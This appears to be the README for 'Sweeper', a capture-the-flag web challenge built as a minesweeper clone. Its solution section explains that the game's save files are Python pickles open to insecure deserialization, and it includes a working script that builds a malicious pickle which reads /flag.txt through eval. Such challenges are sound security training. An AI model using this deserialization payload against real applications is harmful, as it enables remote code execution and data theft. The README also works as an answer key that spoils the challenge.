# Sweeper

A CTFd compatible docker image for a web challenge. Scenario: A classic minesweeper clone with a twist.

## Setup

Run the included build-docker.sh script to build and deploy the container in docker.

## Solution

The save/load functionality is vulnerable to RCE through insecure deserialization. The save files are python pickles that can be exploited to get the flag on the server. The script below generates a file called "evil.pickle" which can be used to obtain the flag when the game is loaded.

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        return (eval, ("{'game_id':open('/flag.txt').read()}",))


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())

    with open("evil.pickle", "wb") as P:
        P.write(base64.urlsafe_b64encode(pickled))
        P.close()
```

